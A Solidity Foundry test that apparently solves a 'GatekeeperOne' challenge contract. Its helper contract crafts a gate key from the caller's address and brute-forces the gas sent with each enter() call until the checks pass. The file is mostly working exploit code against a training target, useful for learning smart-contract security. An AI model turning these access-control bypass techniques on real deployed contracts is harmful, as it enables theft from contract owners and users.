// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Test, console} from "../lib/forge-std/src/Test.sol";
import {GatekeeperOne} from "../src/GatekeeperOne.sol";

contract GatekeeperOneTest is Test {
    GatekeeperOne target;
    GatekeeperOneHacker targetHacker;

    function setUp() public {
        target = new GatekeeperOne();
        targetHacker = new GatekeeperOneHacker(address(target));
    }

    function test_GatekeeperOne() public {
        address user = makeAddr("user");
        uint16 _gateKey16 = uint16(uint160(user));
        uint64 _gateKey64 = uint64(1 << 63) + uint64(_gateKey16);

        bytes8 gateKey = bytes8(_gateKey64);
        vm.prank(user);
        targetHacker.hack(gateKey);
    }
}

contract GatekeeperOneHacker {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function hack(bytes8 gateKey) external {
        for (uint256 i = 100; i < 8191; i++) {
            (bool success, ) = target.call{gas: i + 8191 * 4}(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );
            if (success) {
                break;
            }
        }
    }
}
